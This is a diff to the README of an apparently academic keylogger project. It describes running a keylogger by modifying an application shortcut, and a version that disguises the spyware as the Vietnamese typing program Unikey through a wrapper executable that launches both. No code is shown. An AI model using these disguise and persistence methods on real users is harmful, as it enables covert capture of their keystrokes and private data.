@@ -4,6 +4,8 @@
 
 Keylogger is a research topic in the **Application and System Security** course, focusing on studying and developing spyware that monitors user keystrokes to capture personal information.
 
+# Keylog_V1 and Keylog_V2
+
 ## Requirements
 
 Before running the program, ensure the following:
@@ -14,7 +16,6 @@ Before running the program, ensure the following:
   ```sh
   pip install pynput
   ```
-
 ---
 
 ## Installation & Setup Guide
@@ -52,8 +53,6 @@ Before running the program, ensure the following:
 3. Replace the target path with the location of `Launcher.bat`.
 4. Click **Apply** → **OK** to save the changes.
 
----
-
 ## Execution
 
 Now, whenever the user **launches the application** (e.g., Chrome) using the **modified shortcut**, the Keylogger will also be executed simultaneously.
@@ -61,4 +60,19 @@ Now, whenever the user **launches the application** (e.g., Chrome) using the **m
 > **Disclaimer:** This setup is strictly for educational and testing purposes in a controlled environment. Unauthorized use may violate privacy laws.
 
 ---
+
+# Keylog_V3
+
+## Overview
+
+In this version, I have upgraded the way to write data to txt files, making it work more smoothly, easier to read the data keylogger file. At the same time, I installed this spyware into the Vietnamese typing program Unikey. Simply by writing an additional executable file - Unikey.exe. It will simultaneously run the file UnikeyNT.exe - Vietnamese typing software, and my file Keylog_V3.exe. And so the user was tracked by me.
+
+## Installation
+
+Just download the Unikey or Unikey_V2 folder and run the Unikey.exe file
+
+---
+
+
+
 
